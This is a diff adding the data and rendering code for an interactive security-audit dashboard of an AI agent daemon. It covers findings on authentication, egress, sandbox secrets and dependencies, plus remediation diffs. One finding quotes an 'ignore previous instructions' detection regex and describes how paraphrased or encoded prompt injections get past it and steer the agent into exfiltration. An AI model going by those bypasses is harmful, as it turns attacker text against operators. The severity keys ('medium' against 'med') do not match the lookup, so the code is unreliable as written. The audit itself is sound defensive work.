+  fix:"Pass a minimal allowlisted environment (PATH, HOME, locale, TMPDIR, SYSTEMROOT/COMSPEC on Windows). See diff F-03."},
+
+ {id:"PRA-007",sev:"medium",cat:"Injection",cwe:"CWE-691",files:["broker.py"],
+  title:"Prompt-injection defense is a small English deny-list; PERMISSIVE mode disables it entirely",
+  syn:"Detection is a set of 13 regexes over literal English phrasings. Paraphrase, translation, homoglyphs, base64 payloads or novel jailbreak shapes pass untouched. Worse, ComplianceMode.PERMISSIVE turns off both injection detection and the egress firewall — only the kill-switch remains.",
+  ev:'# broker.py — 13 fixed patterns, e.g.\nr"ignore (all |the )?(previous |prior )?(instructions|prompt|rules)",\nr"forget (everything|prior|previous|the )?",\n...\n# and a mode that switches the whole boundary off:\n# "permissive — ... egress firewall + injection detection are off;\n#  only the kill-switch remains."',
+  risk:"Retrieved content is flagged as data only when it matches known phrasings — a security control whose bypass rate against a motivated adversary is effectively 100%. The agent then plans with attacker-authored context, and the downstream guards (PRA-003/006) are the only things left standing.",
+  fix:"Keep the patterns as tripwires but add structural defenses: wrap retrieved content in delimiters the planner is trained to treat as data, strip instructions from KB excerpts before planning, add an egress allowlist (independent of mode), and require an explicit confirmation when switching to PERMISSIVE."},
+
+ {id:"PRA-008",sev:"medium",cat:"AuthN",cwe:"CWE-307",files:["auth_gate.py"],
+  title:"No rate limiting, lockout, expiry or rotation on the single shared token",
+  syn:"token_matches() is the entire authentication ceremony: one static shared secret, verified with no attempt throttling, no per-IP lockout, no token TTL, no rotation, no revocation list. The browser keeps it in sessionStorage, which any XSS in the 6k-line dashboard instantly reads.",
+  ev:'# auth_gate.py — the whole authn story\ndef token_matches(provided):\n    expected = configured_token()\n    if not expected: return False\n    got = (provided or "").strip()\n    if not got: return False\n    return hmac.compare_digest(expected, got)\n# (docstring) "The browser stores the token in sessionStorage"',
+  risk:"A 32-byte urlsafe token is hard to brute-force offline, but unlimited online guessing against a network-reachable daemon, combined with a token that never expires and is shared by all operators, gives attackers an indefinite, unthrottled target and zero auditability of who approved what.",
+  fix:"Add failed-attempt buckets per source IP (see diff F-05), token TTL + rotation command, and store the client-side token in a sessionStorage scope cleared on tab close at minimum; track which token instance issued each approval."},
+
+ {id:"PRA-009",sev:"medium",cat:"Config",cwe:"CWE-693",files:["daemon.py"],
+  title:"No CSP or security headers on the dashboard; 6,100-line inline SPA out of static reach",
+  syn:"The dashboard is a single inlined HTML string served by the daemon. The reviewed excerpt shows no Content-Security-Policy, X-Content-Type-Options, X-Frame-Options/frame-ancestors, Referrer-Policy or cookie hardening. Because the markup is embedded (and truncated in review), any DOM-XSS sink in it cannot be excluded statically.",
+  ev:'# daemon.py\n_DASHBOARD_HTML = r"""<!doctype html>\n<html lang="en">\n<head>\n<meta charset="utf-8" />\n...\n# 6,172 lines follow; no header-setting code visible in the reviewed excerpt',
+  risk:"Without CSP, a single injection point in the SPA becomes full token theft (PRA-008: token in sessionStorage) and full API control. Missing frame-ancestors invites clickjacking of approval buttons — the human step the whole governance model rests on.",
+  fix:"Send a strict CSP (default-src 'self'; no inline handlers; frame-ancestors 'none'), X-Content-Type-Options: nosniff, Referrer-Policy, and Permissions-Policy on every dashboard/API response. Audit the SPA for innerHTML sinks with a dynamic pass."},
+
+ {id:"PRA-010",sev:"low",cat:"Secrets",cwe:"CWE-598",files:["search.py"],
+  title:"SerpAPI key sent as a URL query parameter",
+  syn:"_run_serpapi builds the request URL with api_key in the query string, so the secret lands in any intermediary log, proxy cache key, and process listings.",
+  ev:'# search.py\ndef _run_serpapi(query, key, n):\n    url = _endpoint("serpapi") + "?" + urllib.parse.urlencode(\n        {"q": query, "api_key": key, "engine": "google", "num": n})',
+  risk:"Query-string credentials are routinely captured in logs of proxies, SIEMs and the provider itself; leaked keys are billable secrets.",
+  fix:"Move the key to a header if the provider supports it; otherwise at minimum redact it from any Praxis-side logging of request URLs and prefer the header-bearing backends (Brave, Tavily)."},
+
+ {id:"PRA-011",sev:"low",cat:"Config",cwe:"CWE-477",files:["config.py"],
+  title:"Non-atomic config writes and silent JSON-error swallowing can clobber live config",
+  syn:"load_config() returns {} on JSONDecodeError; save_config() writes in place with write_text(). A crash mid-write corrupts praxis.json; the next boot reads it as {} and the first save (e.g. ensure_token minting) overwrites the operator's entire configuration.",
+  ev:'# config.py\ndef load_config():\n    try:\n        return json.loads(p.read_text(encoding="utf-8"))\n    except json.JSONDecodeError:\n        return {}          # corrupt file reads as "empty"\ndef save_config(cfg):\n    p.write_text(json.dumps(cfg, indent=2), encoding="utf-8")  # in-place, non-atomic',
+  risk:"Reliability with a security edge: silently replacing a corrupt config can drop governance settings (allowed_tools, compliance mode) back to defaults without any operator signal.",
+  fix:"Write via tempfile + os.replace (atomic), keep a .bak, and surface parse failures loudly (raise or quarantine the bad file) instead of returning {}."},
+
+ {id:"PRA-012",sev:"low",cat:"AuthN",cwe:"CWE-755",files:["auth_gate.py"],
+  title:"hmac.compare_digest raises TypeError on non-ASCII token strings",
+  syn:"Both arguments are str; compare_digest accepts str only when both are ASCII. A request bearing a non-ASCII token in Authorization/X-Praxis-Token makes the comparison raise before returning False.",
+  ev:'# auth_gate.py\n    got = (provided or "").strip()\n    ...\n    return hmac.compare_digest(expected, got)   # str + non-ASCII -> TypeError',
+  risk:"An unhandled exception on a pre-auth code path — at best a 500 per request (log noise / DoS amplifier), at worst an availability hit on the auth check itself if the handler does not contain it.",
+  fix:"Compare bytes: hmac.compare_digest(expected.encode(), got.encode()). Included in diff F-01."},
+
+ {id:"PRA-013",sev:"low",cat:"Supply Chain",cwe:"CWE-1357",files:["Dockerfile","sandbox.py","pyproject.toml"],
+  title:"Mutable base image tag, floor-only dependency constraints, no lockfile",
+  syn:"The runtime and the sandbox execution image both float on the mutable python:3.12-slim tag. Every optional extra pins only a minimum (>=) with no upper bound and no lockfile — markitdown's floor is literally an alpha (0.0.1a2).",
+  ev:'# Dockerfile\nFROM python:3.12-slim AS runtime\n\n# sandbox.py\n_DEFAULT_IMAGE = "python:3.12-slim"   # mutable tag pulled at exec time\n\n# pyproject.toml\nmarkitdown = ["markitdown>=0.0.1a2"]\nmultimodal = ["openai-whisper>=20231117", "opencv-python>=4.8"]',
+  risk:"Rebuilding the same commit a month apart yields different images; a compromised or breaking upstream release is picked up automatically. openai-whisper transitively drags the entire PyTorch stack into any [multimodal] install — a very large, fast-moving attack surface.",
+  fix:"Pin digests for base images; add upper bounds or a lock file for extras used in production; treat the alpha-pinned markitdown as unvetted."},
+
+ {id:"PRA-014",sev:"low",cat:"Secrets",cwe:"CWE-532",files:["broker.py"],
+  title:"Audit redaction regex misses most real secret shapes",
+  syn:"_SECRET_RE only matches api[_-]?key|password|token|secret assignments. Bearer headers, private key blocks, connection strings, AWS-style keys and Basic auth all flow into the audit trail unredacted.",
+  ev:'# broker.py\n_SECRET_RE = re.compile(r"(?i)(api[_-]?key|password|token|secret)\\s*[:=]\\s*\\S+")',
+  risk:"The audit log — readable via the unauthenticated read API (PRA-001) — becomes a secondary secret store, defeating the purpose of the args_hash design.",
+  fix:"Broaden patterns (Authorization schemes, BEGIN .* PRIVATE KEY, \\w+://user:pass@, AKIA/ghp_/sk- prefixes) and redact by entropy scan for high-entropy tokens near key names."},
+
+ {id:"PRA-015",sev:"low",cat:"Supply Chain",cwe:"CWE-88",files:["Dockerfile"],
+  title:"EXTRAS build-arg is concatenated into the pip requirement string",
+  syn:"The wheel path and the EXTRAS build-arg are concatenated into a single shell-quoted pip requirement argument. Anyone able to influence build args injects arbitrary requirement syntax (extra URL/environment markers) into the install step.",
+  ev:'# Dockerfile\nARG EXTRAS=""\nRUN whl="$(ls /tmp/*.whl)" \\\n    && pip install --no-cache-dir "\\${whl}\\${EXTRAS}"',
+  risk:"Low likelihood (build args are usually trusted) but the injection point violates build-arg hygiene and can silently change what the image contains.",
+  fix:"Whitelist EXTRAS against a known set and expand it into bracket syntax yourself, e.g. python -c generating "whl[docs]" only for allowed values."},
+
+ {id:"PRA-016",sev:"info",cat:"Config",cwe:"CWE-200",files:["broker.py"],
+  title:"Developer name hardcoded in an injection pattern",
+  syn:"One regex literalizes a specific person: do not tell ... michael. It leaks a developer identity into every install and is meaningless for any other operator.",
+  ev:'# broker.py\nr"do not tell (?:anyone|the user|michael)",',
+  risk:"Informational: identity leakage and dead-weight rule; no direct exploit.",
+  fix:"Generalize the pattern; keep personal names out of shipped rules."},
+
+ {id:"PRA-017",sev:"info",cat:"Config",cwe:"CWE-1042",files:["search.py"],
+  title:"Keyless DuckDuckGo HTML scraping with a spoofed Chrome User-Agent",
+  syn:"The default search backend parses html.duckduckgo.com with regexes while claiming to be desktop Chrome 124 — an unsupported, fragile integration that can break (or be poisoned) without notice.",
+  ev:'# search.py\n_DDG_ENDPOINT = "https://html.duckduckgo.com/html/"\n_DDG_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "\n           "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")',
+  risk:"Informational/reliability: ToS friction and regex-over-untrusted-HTML parsing (mild ReDoS/parse-poisoning surface).",
+  fix:"Offer the keyless path only as an explicit opt-in, document the ToS stance, and cap parsed input size."},
+
+ {id:"PRA-018",sev:"info",cat:"Config",cwe:"CWE-367",files:["daemon.py"],
+  title:"TOCTOU race in port selection",
+  syn:"_find_port() probes with connect_ex and returns the first closed port; nothing binds it before the server does, so another process can grab it in the window.",
+  ev:'# daemon.py\ndef _find_port(host, start, end):\n    for port in range(start, end):\n        with socket.socket(...) as s:\n            if s.connect_ex((host, port)) != 0:\n                return port',
+  risk:"Informational: rare local race; worst case the daemon fails to start or, in hostile multi-user environments, a squatting process receives the bind.",
+  fix:"Bind with SO_REUSEADDR to a chosen port and retry on EADDRINUSE instead of pre-probing."},
+
+ {id:"PRA-019",sev:"info",cat:"Injection",cwe:"CWE-693",files:["real_tools.py","broker.py","daemon.py","Dockerfile"],positive:true,
+  title:"Verified controls worth preserving (positive findings)",
+  syn:"Several defenses in the reviewed code are correctly implemented and materially reduce risk — they should be protected with tests so regressions are caught.",
+  ev:'# real_tools.py — traversal defense covers POSIX + Windows flavors\nif (raw.is_absolute() or relative.startswith(("/", "\\\\"))\n        or PureWindowsPath(relative).is_absolute()\n        or PureWindowsPath(relative).drive\n        or PurePosixPath(relative).is_absolute()):\n    raise ValueError(...)\n\n# broker.py — kill-switch is durable across processes\nif self._store is not None:\n    self._tripped = bool(self._store.get_killswitch())\n\n# daemon.py — upload + SSE + idempotency caps (100 MiB, 1024, bounded receipts)\n# Dockerfile — non-root uid 10001, chowned /data',
+  risk:"None — these are strengths. Their regression would create risk.",
+  fix:"Pin each with a dedicated unit test (traversal matrix, kill-switch persistence across Store instances, cap enforcement)."}
+];
+
+const HEAT = {
+ modules:["auth_gate.py","daemon.py","broker.py","sandbox.py","config.py","gateways.py","real_tools.py","search.py","tools.py","Dockerfile","pyproject.toml"],
+ rows:[
+  [2,3,0,0,2,0,0,0],
+  [0,3,0,2,0,0,0,2],
+  [0,0,2,0,1,0,0,0],
+  [0,0,0,0,2,2,0,0],
+  [0,0,0,0,2,0,0,1],
+  [0,0,0,3,0,0,0,0],
+  [0,0,"p",2,0,0,0,0],
+  [0,0,0,0,1,0,0,0],
+  [0,0,0,0,0,0,0,0],
+  [0,2,0,0,0,0,1,0],
+  [0,0,0,0,0,0,1,0]
+ ]
+};
+
+const GRAPH_NODES = [
+ {id:"core",label:"praxis-agent",r:30,type:"core",cons:"dependencies = []",note:"The core installs nothing — HTTP, crypto, storage and tooling are all stdlib. This is the project's strongest supply-chain property: the default attack surface is the Python runtime itself."},
+ {id:"img",label:"python:3.12-slim",r:19,type:"risk",cons:"FROM python:3.12-slim (mutable tag)",risk:"Mutable tag — no digest pin. Rebuilds silently track whatever upstream publishes. Also the image the sandbox pulls at exec time.",note:"Base runtime image for the daemon container and the default sandbox execution image."},
+ {id:"g_docs",label:"[docs]",r:13,type:"grp",cons:"optional extra",note:"PDF/Word/PowerPoint/Excel/.msg ingestion for the RAG knowledge base."},
+ {id:"g_art",label:"[artifacts]",r:13,type:"grp",cons:"optional extra",note:"Professional artifact renderers (DOCX/PDF/PPTX/XLSX) plus semantic PDF validation."},
+ {id:"g_mm",label:"[multimodal]",r:13,type:"grp",cons:"optional extra",note:"Image / audio / video intake."},
+ {id:"g_fast",label:"[fast]",r:11,type:"grp",cons:"optional extra",note:"Numpy-accelerated vector search; pure-Python fallback when absent."},
+ {id:"g_mcp",label:"[mcp]",r:12,type:"grp",cons:"optional extra",note:"Model Context Protocol adapter — exposes Praxis tools as an MCP server / consumes external MCP servers."},
+ {id:"g_br",label:"[browser]",r:13,type:"grp",cons:"optional extra",note:"Governed browser use: navigate/read autonomous, click/type held for approval."},
+ {id:"g_key",label:"[keyring]",r:11,type:"grp",cons:"optional extra",note:"OS-keychain credential storage; plaintext-file fallback otherwise."},
+ {id:"g_md",label:"[markitdown]",r:12,type:"grp",cons:"optional extra",note:"Single-dependency rich-format converter alternative."},
+ {id:"g_dev",label:"[dev] / [mutation]",r:12,type:"grp",cons:"dev-only",note:"Test and mutation tooling — never shipped in the runtime image."},
+ {id:"pypdf",label:"pypdf",r:9,type:"pkg",cons:">=4.0",note:"PDF text extraction; also used for semantic validation of generated PDFs. History of parsing CVEs in the PDF ecosystem — keep current."},
+ {id:"docx",label:"python-docx",r:9,type:"pkg",cons:">=1.1",note:"Word document parse/write ([docs] + [artifacts])."},
+ {id:"pptx",label:"python-pptx",r:9,type:"pkg",cons:">=0.6",note:"PowerPoint parse/write. Floor is old (0.6) — untested upper range."},
+ {id:"openpyxl",label:"openpyxl",r:9,type:"pkg",cons:">=3.1",note:"Excel parse/write; XML entity handling worth tracking."},
+ {id:"extractmsg",label:"extract-msg",r:9,type:"pkg",cons:">=0.48",note:".msg Outlook parsing — parses untrusted email structures."},
+ {id:"reportlab",label:"reportlab",r:9,type:"pkg",cons:">=4.0",note:"PDF generation ([artifacts])."},
+ {id:"pillow",label:"Pillow",r:9,type:"pkg",cons:">=10.0",note:"Image processing ([artifacts] + [multimodal]); long CVE history in image decoders — parse only trusted media or keep tightly updated."},
+ {id:"whisper",label:"openai-whisper",r:12,type:"risk",cons:">=20231117",risk:"Drags the entire PyTorch stack transitively — one of the largest, fastest-moving dependency trees in Python. Date-versioned floor, no upper bound.",note:"Speech-to-text for multimodal intake."},
+ {id:"opencv",label:"opencv-python",r:10,type:"pkg",cons:">=4.8",note:"Video/image intake; ships native binaries."},
+ {id:"numpy",label:"numpy",r:9,type:"pkg",cons:">=1.24",note:"Vector math for [fast] search."},
+ {id:"mcp",label:"mcp",r:10,type:"risk",cons:">=1.0",risk:"Young protocol library with a moving API surface; expands Praxis's reachable tool space to external MCP servers. Auth scope of consumed servers should be reviewed per connection.",note:"MCP adapter backend."},
+ {id:"playwright",label:"playwright",r:11,type:"pkg",cons:">=1.40",note:"Real-browser automation ([browser]). Downloaded browser binaries are a supply-chain surface of their own."},
+ {id:"keyring",label:"keyring",r:8,type:"pkg",cons:">=24",note:"OS keychain access for provider keys."},
+ {id:"markitdown",label:"markitdown",r:11,type:"risk",cons:">=0.0.1a2",risk:"Pinned floor is a pre-release alpha of a new project. Effectively unvetted code running wherever [markitdown] is installed.",note:"Rich-format converter."},
+ {id:"pytest",label:"pytest + plugins",r:8,type:"pkg",cons:">=7.0 (dev)",note:"Dev-only: pytest, ruff, mypy, hypothesis, cosmic-ray."}
+];
+const GRAPH_LINKS = [
+ ["core","img"],["core","g_docs"],["core","g_art"],["core","g_mm"],["core","g_fast"],
+ ["core","g_mcp"],["core","g_br"],["core","g_key"],["core","g_md"],["core","g_dev"],
+ ["g_docs","pypdf"],["g_docs","docx"],["g_docs","pptx"],["g_docs","openpyxl"],["g_docs","extractmsg"],
+ ["g_art","reportlab"],["g_art","pillow"],["g_art","docx"],["g_art","pptx"],["g_art","openpyxl"],["g_art","pypdf"],
+ ["g_mm","whisper"],["g_mm","opencv"],["g_mm","pillow"],
+ ["g_fast","numpy"],["g_mcp","mcp"],["g_br","playwright"],["g_key","keyring"],["g_md","markitdown"],["g_dev","pytest"]
+];
+
+const DIFFS = [
+ {file:"hybridagent/auth_gate.py",refs:"PRA-004 · PRA-012",title:"Restrict the minted token file; compare bytes",
+  note:"save_config() performs no permission hardening — apply the same secure_file() treatment the API-key path already uses, and refuse to mint into an unrestrictable file. Encoding both sides to bytes keeps compare_digest from raising on non-ASCII input.",
+  lines:[
+   ["del","    auth[\"token\"] = token"],
+   ["del","    auth[\"minted\"] = True"],
+   ["del","    cfg.save_config(conf)"],
+   ["del","    return token"],
+   ["add","    auth[\"token\"] = token"],
+   ["add","    auth[\"minted\"] = True"],
+   ["add","    path = cfg.save_config(conf)"],
+   ["add","    if not cfg.secure_file(path):"],
+   ["add","        raise RuntimeError("],
+   ["add","            \"could not restrict permissions on praxis.json; refusing to \"],
+   ["add","            \"leave a live auth token world-readable\")"],
+   ["add","    return token"],
+   ["ctx",""],
+   ["del","    # Constant-time compare of raw token (length mismatch returns False)."],
+   ["del","    return hmac.compare_digest(expected, got)"],
+   ["add","    # Compare bytes: compare_digest raises TypeError on non-ASCII str."],
+   ["add","    return hmac.compare_digest("],
+   ["add","        expected.encode(\"utf-8\"), got.encode(\"utf-8\"))"]
+  ]},
+ {file:"hybridagent/gateways.py",refs:"PRA-003",title:"Shared egress guard — HTTPS-only, private ranges blocked",
+  note:"Every outbound URL (webhook/discord/slack overrides, ntfy, fetch_url, search endpoints) passes through this check before urlopen. It stops the SSRF primitive and the prompt-injection exfiltration channel at the transport layer, independent of compliance mode.",
+  lines:[
+   ["add","import ipaddress"],
+   ["add","from urllib.parse import urlsplit"],
+   ["add",""],
+   ["add","_EGRESS_ERROR = \"blocked non-HTTPS or private-network egress: {}\""],
+   ["add",""],
+   ["add","def _assert_safe_url(url: str) -> None:"],
+   ["add","    parts = urlsplit(url)"],
+   ["add","    if parts.scheme != \"https\":"],
+   ["add","        raise ValueError(_EGRESS_ERROR.format(url))"],
+   ["add","    host = (parts.hostname or \"\").strip(\"[]\")"],
+   ["add","    try:"],
+   ["add","        ip = ipaddress.ip_address(host)"],
+   ["add","    except ValueError:"],
+   ["add","        return  # hostname, not an IP literal; DNS resolved at connect time"],
+   ["add","    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:"],
+   ["add","        raise ValueError(_EGRESS_ERROR.format(url))"],
+   ["ctx",""],
+   ["del","def _post_json(url: str, payload: dict, headers: dict | None = None,"],
+   ["del","               timeout: float = 15.0) -> tuple[int, str]:"],
+   ["del","    data = json.dumps(payload).encode(\"utf-8\")"],
+   ["add","def _post_json(url: str, payload: dict, headers: dict | None = None,"],
+   ["add","               timeout: float = 15.0) -> tuple[int, str]:"],
+   ["add","    _assert_safe_url(url)"],
+   ["add","    data = json.dumps(payload).encode(\"utf-8\")"]
+  ]},
+ {file:"hybridagent/sandbox.py",refs:"PRA-006",title:"Scrub the environment handed to sandboxed commands",
+  note:"The local backend currently forwards every daemon environment variable — including all provider API keys — into the executed payload. An allowlist removes the entire class of 'approved command vacuums the credentials' attacks.",
+  lines:[
+   ["ctx","def _run_local(command, workdir: str, timeout: float,"],
+   ["ctx","               env: dict | None) -> ExecResult:"],
+   ["add","    _SAFE_ENV = (\"PATH\", \"HOME\", \"LANG\", \"LC_ALL\", \"TMPDIR\","],
+   ["add","                 \"SYSTEMROOT\", \"COMSPEC\", \"PRAXIS_WORK_DIR\")"],
+   ["add","    scrubbed = {k: os.environ[k] for k in _SAFE_ENV if k in os.environ}"],
+   ["add","    scrubbed.update(env or {})"],
+   ["ctx","    use_shell = isinstance(command, str)"],
+   ["ctx","    try:"],
+   ["del","        proc = subprocess.run("],
+   ["del","            command, cwd=workdir, capture_output=True, text=True,"],
+   ["del","            timeout=timeout, env={**os.environ, **(env or {})}, check=False,"],
+   ["del","            shell=use_shell)"],
+   ["add","        proc = subprocess.run("],
+   ["add","            command, cwd=workdir, capture_output=True, text=True,"],
+   ["add","            timeout=timeout, env=scrubbed, check=False,"],
+   ["add","            shell=use_shell)"]
+  ]},
+ {file:"hybridagent/sandbox.py",refs:"PRA-005",title:"Fail-closed backend selection",
+  note:"A backend the operator explicitly requested must never silently become the host shell. Return the requested name and let run() surface the misconfiguration as an error instead; local fallback stays available only as an explicit opt-in.",
+  lines:[
+   ["del","    if choice == \"ssh\":"],
+   ["del","        if block.get(\"ssh_host\"):"],
+   ["del","            return \"ssh\""],
+   ["del","        _log.warning(\"sandbox backend 'ssh' requested but agents.sandbox.ssh_host \""],
+   ["del","                     \"is unset; falling back to 'local'\")"],
+   ["del","        return \"local\""],
+   ["add","    if choice == \"ssh\":"],
+   ["add","        if block.get(\"ssh_host\"):"],
+   ["add","            return \"ssh\""],
+   ["add","        _log.error(\"sandbox backend 'ssh' requested but agents.sandbox.ssh_host \""],
+   ["add","                   \"is unset; refusing downgrade to 'local' (fail-closed)\")"],
+   ["add","        return \"ssh\"  # run() reports the misconfiguration, executes nothing"],
+   ["ctx",""],
+   ["del","        if block.get(\"allow_local_fallback\"):"],
+   ["del","            _log.warning(\"sandbox backend 'docker' requested but Docker is \""],
+   ["del","                         \"unavailable; allow_local_fallback=true -> 'local'\")"],
+   ["del","            return \"local\""],
+   ["add","        if block.get(\"allow_local_fallback\", False):  # explicit opt-in only"],
+   ["add","            _log.warning(\"docker unavailable; explicit allow_local_fallback \""],
+   ["add","                         \"-> 'local'\")"],
+   ["add","            return \"local\""]
+  ]},
+ {file:"hybridagent/daemon.py",refs:"PRA-001 · PRA-008",title:"Authenticate every API route, throttle failures",
+  note:"Move the auth check from individual mutating handlers to the shared dispatch so reads are covered too, and add a per-source-IP failure bucket. Ten failures in five minutes quarantines the source.",
+  lines:[
+   ["del","    def _check_auth(self) -> bool:"],
+   ["del","        # Called from mutating handlers only."],
+   ["del","        return (not auth_required(bind_host)"],
+   ["del","                or token_matches(extract_token(self.headers)))"],
+   ["add","    _AUTH_FAILS: dict[str, list[float]] = {}"],
+   ["add",""],
+   ["add","    def _check_auth(self) -> bool:"],
+   ["add","        \"\"\"Enforced on EVERY /api/ route — reads included.\"\"\""],
+   ["add","        if not auth_required(bind_host):"],
+   ["add","            return True"],
+   ["add","        key = self.client_address[0]"],
+   ["add","        now = time.monotonic()"],
+   ["add","        bucket = [t for t in _AUTH_FAILS.get(key, []) if now - t < 300]"],
+   ["add","        if len(bucket) >= 10:"],
+   ["add","            return False                      # 10 failures / 5 min / source"],
+   ["add","        ok = token_matches(extract_token(self.headers))"],
+   ["add","        if not ok:"],
+   ["add","            bucket.append(now)"],
+   ["add","        _AUTH_FAILS[key] = bucket"],
+   ["add","        return ok"]
+  ]},
+ {file:"Dockerfile",refs:"PRA-001 · PRA-013",title:"Loopback default in the image; digest-pinned base",
+  note:"The image should not widen the daemon's exposure on its own. Operators who want remote access override PRAXIS_HOST deliberately — ideally behind an authenticating TLS proxy.",
+  lines:[
+   ["del","ARG EXTRAS=\"\""],
+   ["del","ENV PRAXIS_HOME=/data \\\n    PRAXIS_HOST=0.0.0.0 \\\n    PYTHONUNBUFFERED=1"],
+   ["add","ARG EXTRAS=\"\""],
+   ["add","ENV PRAXIS_HOME=/data \\\n    PRAXIS_HOST=127.0.0.1 \\\n    PYTHONUNBUFFERED=1"],
+   ["add","# Remote access: -e PRAXIS_HOST=0.0.0.0 AND an authenticating TLS proxy."],
+   ["ctx",""],
+   ["del","FROM python:3.12-slim AS runtime"],
+   ["add","FROM python:3.12-slim@sha256:<pinned-digest> AS runtime"],
+   ["add","# Pin and rotate digests deliberately; sandbox.py _DEFAULT_IMAGE too."]
+  ]}
+];
+
+/* ============================ HELPERS ============================ */
+const $=s=>document.querySelector(s);
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+const SEV={crit:{l:"Critical",c:"var(--crit)"},high:{l:"High",c:"var(--high)"},med:{l:"Medium",c:"var(--med)"},low:{l:"Low",c:"var(--low)"},info:{l:"Info",c:"var(--info)"}};
+const sevOf=f=>f.sev;
+const rgbOf={high:"#e07c3f",med:"#d9a53a",low:"#6fa39a",info:"#8b8371",crit:"#e5484d"};
+
+const KW=/\b(def|class|return|returns|if|elif|else|for|while|import|from|not|in|is|and|or|None|True|False|try|except|raise|with|as|lambda|yield|pass|assert|async|await|del|break|continue|global)\b/;
+const TOK=new RegExp("([rbfu]{0,2}(?:'(?:[^'\\\\]|\\\\.)*'|\"(?:[^\"\\\\]|\\\\.)*\")|(#.*$)|\\b(def|class|return|returns|if|elif|else|for|while|import|from|not|in|is|and|or|None|True|False|try|except|raise|with|as|lambda|yield|pass|assert|async|await|del|break|continue|global)\\b)","g");
+function hl(line){
+  let out="",last=0,m;TOK.lastIndex=0;
+  while((m=TOK.exec(line))!==null){
+    out+=esc(line.slice(last,m.index));
+    const cls=m[2]!==undefined?"com":(m[1]!==undefined?"str":"kw");
+    out+='<span class="'+cls+'">'+esc(m[0])+"</span>";
+    last=m.index+m[0].length;
+    if(m[0].length===0)TOK.lastIndex++;
+  }
+  return out+esc(line.slice(last));
+}
+function codeBlock(ev){
+  return '<pre class="ev">'+ev.split("\n").map(hl).join("\n")+"</pre>";
+}
+
+/* ============================ FINDINGS ============================ */
+const state={sev:new Set(["crit","high","med","low","info"]),q:"",mod:null,cat:null};
+
+function renderChips(){
+  const box=$("#sevChips");box.innerHTML="";
+  const counts={crit:0,high:0,med:0,low:0,info:0};
+  FINDINGS.forEach(f=>counts[sevOf(f)]++);
+  ["crit","high","med","low","info"].forEach(s=>{
+    if(s==="crit"&&counts[s]===0)return;
+    const b=document.createElement("button");
+    b.className="chip"+(state.sev.has(s)?" on":"");
+    b.type="button";
+    b.innerHTML=esc(SEV[s].l)+'<span class="c">'+counts[s]+"</span>";
+    if(state.sev.has(s))b.style.background=rgbOf[s],b.style.borderColor=rgbOf[s];
+    b.onclick=()=>{
+      state.sev.has(s)?state.sev.delete(s):state.sev.add(s);
+      renderChips();renderFindings();
+    };
+    box.appendChild(b);
+  });
+  const s=document.createElement("div");s.className="search";
+  s.innerHTML='<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg><input type="text" placeholder="search findings, files, CWE…" aria-label="Search findings">';
+  s.querySelector("input").addEventListener("input",e=>{state.q=e.target.value.trim().toLowerCase();renderFindings();});
+  box.appendChild(s);
+}
+
+function matches(f){
+  if(!state.sev.has(sevOf(f)))return false;
+  if(state.mod&&f.files.indexOf(state.mod)===-1)return false;
+  if(state.cat&&f.cat!==state.cat)return false;
+  if(state.q){
+    const hay=(f.id+" "+f.title+" "+f.syn+" "+f.files.join(" ")+" "+f.cwe+" "+f.cat).toLowerCase();
+    if(hay.indexOf(state.q)===-1)return false;
+  }
+  return true;
+}
+
+function renderFindings(){
+  const box=$("#ledger");box.innerHTML="";
+  const list=FINDINGS.filter(matches);
+  $("#liveCount").textContent=list.length+" / "+FINDINGS.length;
+  if(!list.length){
+    box.innerHTML='<div class="empty">no findings match the current filters</div>';return;
+  }
+  list.forEach(f=>{
+    const col=f.positive?"var(--ok)":rgbOf[sevOf(f)];
+    const art=document.createElement("article");
+    art.className="finding";art.style.setProperty("--sevc",col);
+    art.innerHTML=
+      '<button class="f-head" type="button" aria-expanded="false">'+
+        '<span class="f-id"><b>'+(f.positive?"PASS":SEV[sevOf(f)].l)+'</b>'+esc(f.id)+'</span>'+
+        '<span class="f-title">'+esc(f.title)+
+          '<span class="f-sub"><span class="loc">'+f.files.map(esc).join(" · ")+'</span><span>'+esc(f.cat)+'</span></span>'+
+        '</span>'+
+        '<span class="f-right"><span class="sev-badge">'+(f.positive?"verified control":SEV[sevOf(f)].l)+'</span>'+
+        '<svg class="f-chev" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M9 6l6 6-6 6"/></svg></span>'+
+      '</button>'+
+      '<div class="acc-body"><div class="acc-in"><div class="f-body">'+
+        '<div class="full"><h4>Description</h4><p>'+esc(f.syn)+'</p>'+
+        '<h4>Evidence</h4>'+codeBlock(f.ev)+'</div>'+
+        '<div><h4>Risk</h4><p>'+esc(f.risk)+'</p></div>'+
+        '<div><h4>'+(f.positive?"Preservation":"Recommended fix")+'</h4><p>'+esc(f.fix)+'</p>'+
+        (f.positive?"":'<p style="margin-top:2px"><span class="cwe">'+esc(f.cwe)+'</span></p>')+'</div>'+
+      '</div></div></div>';
+    const btn=art.querySelector(".f-head");
+    btn.addEventListener("click",()=>{
+      const open=art.classList.toggle("open");
+      btn.setAttribute("aria-expanded",open);
+    });
+    box.appendChild(art);
+  });
+}
+
+/* ============================ SUMMARY ============================ */
+function renderSummary(){
+  const counts={crit:0,high:0,med:0,low:0,info:0};
+  FINDINGS.forEach(f=>counts[sevOf(f)]++);
+  const total=FINDINGS.length-1; // exclude positive entry from bar widths
+  const bar=$("#sevbar"),row=$("#sevrow");
+  ["crit","high","med","low","info"].forEach(s=>{
+    if(counts[s]===0)return;
+    const seg=document.createElement("div");
+    seg.className="seg";seg.style.background=rgbOf[s];
+    seg.dataset.sev=s;seg.textContent=counts[s];
+    seg.title=SEV[s].l;
+    bar.appendChild(seg);
+    requestAnimationFrame(()=>requestAnimationFrame(()=>{seg.style.width=Math.max(8,(counts[s]/total)*100)+"%";}));
+    seg.onclick=()=>{state.sev=new Set([s]);state.q="";state.mod=state.cat=null;updateX();renderChips();renderFindings();
+      document.getElementById("findings").scrollIntoView({behavior:"smooth"});};
+    const r=document.createElement("span");
